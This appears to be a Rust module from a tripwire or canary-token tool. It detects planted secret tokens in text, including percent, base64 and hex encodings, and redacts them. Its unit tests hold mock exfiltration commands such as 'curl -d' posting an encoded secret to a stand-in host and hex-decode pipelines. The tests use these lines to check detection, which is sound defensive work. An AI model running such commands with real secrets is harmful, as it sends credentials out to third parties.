//! Finds planted tokens in text, including common encodings of it.

use base64::Engine;
use base64::alphabet::{Alphabet, STANDARD, URL_SAFE};
use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use serde::{Deserialize, Serialize};

use crate::token::{BASE32, ID_LEN, MARKER, is_valid_id};

const MIN_BASE64_RUN: usize = 16;
const MIN_HEX_RUN: usize = 32;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Encoding {
    Raw,
    Percent,
    Base64,
    Hex,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct Hit {
    pub id: String,
    pub encoding: Encoding,
}

/// Every distinct (id, encoding) pair in `text`, in order of discovery.
pub fn find(text: &str) -> Vec<Hit> {
    let mut hits = Vec::new();
    let mut push = |ids: Vec<String>, encoding| {
        for id in ids {
            let hit = Hit { id, encoding };
            if !hits.contains(&hit) {
                hits.push(hit);
            }
        }
    };
    let bytes = text.as_bytes();
    push(scan_bytes(bytes), Encoding::Raw);
    for run in decoded_runs(bytes) {
        push(scan_bytes(&run.bytes), run.encoding);
    }
    hits
}

/// `text` with each planted value replaced by `[tripwire:<id>]` and each
/// encoded run holding one by `[tripwire:<id> <encoding>]`. If a token still
/// remains, the whole text is replaced, so the result never contains one.
pub fn redact(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut spans: Vec<(usize, usize, String)> = Vec::new();
    for (start, id) in raw_matches(bytes) {
        let mut end = start + MARKER.len() + ID_LEN;
        // The random tail of a planted value is secret material too.
        while end < bytes.len()
            && (bytes[end].is_ascii_alphanumeric() || b"+/".contains(&bytes[end]))
        {
            end += 1;
        }
        spans.push((start, end, id));
    }
    for run in decoded_runs(bytes) {
        let ids = scan_bytes(&run.bytes);
        if !ids.is_empty() {
            let encoding = format!("{:?}", run.encoding).to_lowercase();
            spans.push((run.start, run.end, format!("{} {encoding}", ids.join(","))));
        }
    }
    spans.sort_by_key(|&(start, end, _)| (start, std::cmp::Reverse(end)));

    let mut out = String::with_capacity(text.len());
    let mut last = 0;
    for (start, end, label) in spans {
        if start < last {
            continue;
        }
        // Spans start and end at ASCII bytes, so these are char boundaries.
        out.push_str(&text[last..start]);
        out.push_str(&format!("[tripwire:{label}]"));
        last = end;
    }
    out.push_str(&text[last..]);
    if find(&out).is_empty() {
        out
    } else {
        "[redacted: contains an encoded tripwire token]".to_string()
    }
}

/// Ids of raw `TRIPWIRE<id>` occurrences, matched case-insensitively.
fn scan_bytes(bytes: &[u8]) -> Vec<String> {
    raw_matches(bytes).into_iter().map(|(_, id)| id).collect()
}

/// (start offset, id) of each valid raw token.
fn raw_matches(bytes: &[u8]) -> Vec<(usize, String)> {
    let marker = MARKER.as_bytes();
    let len = marker.len() + ID_LEN;
    let mut out = Vec::new();
    let mut i = 0;
    while i + len <= bytes.len() {
        if bytes[i..i + marker.len()].eq_ignore_ascii_case(marker) {
            let id: String = bytes[i + marker.len()..i + len]
                .iter()
                .map(|b| b.to_ascii_uppercase() as char)
                .collect();
            if id.bytes().all(|b| BASE32.contains(&b)) && is_valid_id(&id) {
                out.push((i, id));
                i += len;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// A decoded run of encoded text and where it sits in the input.
struct Decoded {
    start: usize,
    end: usize,
    encoding: Encoding,
    bytes: Vec<u8>,
}

fn decoded_runs(bytes: &[u8]) -> Vec<Decoded> {
    let mut out = Vec::new();

    let is_pct = |b: u8| b.is_ascii_alphanumeric() || b"%._~+-".contains(&b);
    for (start, end) in runs(bytes, 3, is_pct) {
        if bytes[start..end].contains(&b'%') {
            out.push(Decoded {
                start,
                end,
                encoding: Encoding::Percent,
                bytes: percent_decode(&bytes[start..end]),
            });
        }
    }

    let engines = [engine(&STANDARD), engine(&URL_SAFE)];
    let is_b64 = |b: u8| b.is_ascii_alphanumeric() || b"+/-_".contains(&b);
    for (start, mut end) in runs(bytes, MIN_BASE64_RUN, is_b64) {
        let run = &bytes[start..end];
        while end < bytes.len() && bytes[end] == b'=' && end - start < run.len() + 2 {
            end += 1;
        }
        // Offsets 1–3 let a blob glued to a short prefix still decode.
        for offset in 0..4 {
            let mut part = &run[offset..];
            if part.len() % 4 == 1 {
                part = &part[..part.len() - 1];
            }
            for engine in &engines {
                if let Ok(decoded) = engine.decode(part) {
                    out.push(Decoded {
                        start,
                        end,
                        encoding: Encoding::Base64,
                        bytes: decoded,
                    });
                }
            }
        }
    }

    for (start, end) in runs(bytes, MIN_HEX_RUN, |b| b.is_ascii_hexdigit()) {
        let digit = |b: u8| (b as char).to_digit(16).expect("validated hex digit") as u8;
        for offset in 0..2 {
            let decoded = bytes[start + offset..end]
                .as_chunks::<2>()
                .0
                .iter()
                .map(|[h, l]| digit(*h) << 4 | digit(*l))
                .collect();
            out.push(Decoded {
                start,
                end,
                encoding: Encoding::Hex,
                bytes: decoded,
            });
        }
    }
    out
}

fn percent_decode(bytes: &[u8]) -> Vec<u8> {
    let hex = |b: u8| (b as char).to_digit(16).map(|d| d as u8);
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && i + 2 < bytes.len()
            && let (Some(h), Some(l)) = (hex(bytes[i + 1]), hex(bytes[i + 2]))
        {
            out.push(h << 4 | l);
            i += 3;
            continue;
        }
        out.push(bytes[i]);
        i += 1;
    }
    out
}

/// (start, end) of maximal runs of bytes satisfying `pred`, at least `min` long.
fn runs(bytes: &[u8], min: usize, pred: impl Fn(u8) -> bool) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let mut start = None;
    for (i, &b) in bytes.iter().chain(std::iter::once(&b' ')).enumerate() {
        match (pred(b) && i < bytes.len(), start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                if i - s >= min {
                    out.push((s, i));
                }
                start = None;
            }
            _ => {}
        }
    }
    out
}

fn engine(alphabet: &Alphabet) -> GeneralPurpose {
    GeneralPurpose::new(
        alphabet,
        GeneralPurposeConfig::new()
            .with_decode_padding_mode(DecodePaddingMode::Indifferent)
            .with_decode_allow_trailing_bits(true),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::token::new_id;
    use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};

    fn token() -> (String, String) {
        let id = new_id(|_| false);
        (format!("{MARKER}{id}"), id)
    }

    fn hits(text: &str) -> Vec<(String, Encoding)> {
        find(text).into_iter().map(|h| (h.id, h.encoding)).collect()
    }

    #[test]
    fn finds_raw_token() {
        let (tok, id) = token();
        let text = format!("aws_access_key_id = AKIA{tok}\n");
        assert_eq!(hits(&text), vec![(id, Encoding::Raw)]);
    }

    #[test]
    fn finds_token_regardless_of_case() {
        let (tok, id) = token();
        assert_eq!(hits(&tok.to_lowercase()), vec![(id, Encoding::Raw)]);
    }

    #[test]
    fn ignores_marker_with_bad_check_characters() {
        let (tok, _) = token();
        let mut bad = tok.into_bytes();
        let last = bad.len() - 1;
        bad[last] = if bad[last] == b'A' { b'B' } else { b'A' };
        assert!(find(std::str::from_utf8(&bad).unwrap()).is_empty());
    }

    #[test]
    fn ignores_ordinary_prose() {
        assert!(find("the tripwire detection fired; tripwire-sandbox is fine").is_empty());
    }

    #[test]
    fn reports_each_id_and_encoding_once() {
        let (tok, id) = token();
        assert_eq!(hits(&format!("{tok} {tok}")), vec![(id, Encoding::Raw)]);
    }

    #[test]
    fn finds_base64_encoded_token() {
        let (tok, id) = token();
        let blob = STANDARD.encode(format!("secret={tok}&user=ci"));
        let text = format!("curl -d {blob} https://example.invalid");
        assert_eq!(hits(&text), vec![(id, Encoding::Base64)]);
    }

    #[test]
    fn finds_url_safe_base64_glued_to_a_prefix() {
        let (tok, id) = token();
        let blob = URL_SAFE_NO_PAD.encode(format!("{{\"k\":\"{tok}\"}}"));
        let text = format!("https://example.invalid/?q=x{blob}");
        assert_eq!(hits(&text), vec![(id, Encoding::Base64)]);
    }

    #[test]
    fn finds_hex_encoded_token() {
        let (tok, id) = token();
        let hex: String = format!("k={tok}")
            .bytes()
            .map(|b| format!("{b:02x}"))
            .collect();
        assert_eq!(
            hits(&format!("echo {hex} | xxd -r -p")),
            vec![(id, Encoding::Hex)]
        );
    }

    #[test]
    fn finds_percent_encoded_token() {
        let (tok, id) = token();
        let text = format!("https://example.invalid/?k=%{:02X}{}", b'T', &tok[1..]);
        assert_eq!(hits(&text), vec![(id, Encoding::Percent)]);
    }

    #[test]
    fn redact_replaces_raw_tokens() {
        let (tok, id) = token();
        let out = redact(&format!("cat creds: {tok}!"));
        assert_eq!(out, format!("cat creds: [tripwire:{id}]!"));
        assert!(find(&out).is_empty());
    }

    #[test]
    fn redact_removes_the_whole_value() {
        let (tok, id) = token();
        let out = redact(&format!("k={tok}aB3+/xYz&next=1 then @host"));
        assert_eq!(out, format!("k=[tripwire:{id}]&next=1 then @host"));
    }

    #[test]
    fn redact_replaces_encoded_runs_and_keeps_context() {
        let (tok, id) = token();
        let blob = STANDARD.encode(format!("x={tok}"));
        let out = redact(&format!("curl -d {blob} https://example.invalid"));
        assert_eq!(
            out,
            format!("curl -d [tripwire:{id} base64] https://example.invalid")
        );

        let hex: String = tok.bytes().map(|b| format!("{b:02x}")).collect();
        assert_eq!(
            redact(&format!("echo {hex}")),
            format!("echo [tripwire:{id} hex]")
        );

        let pct = format!("GET /?k=%{:02X}{} HTTP/1.1", b'T', &tok[1..]);
        assert_eq!(
            redact(&pct),
            format!("GET /?k=[tripwire:{id} percent] HTTP/1.1")
        );
    }
}
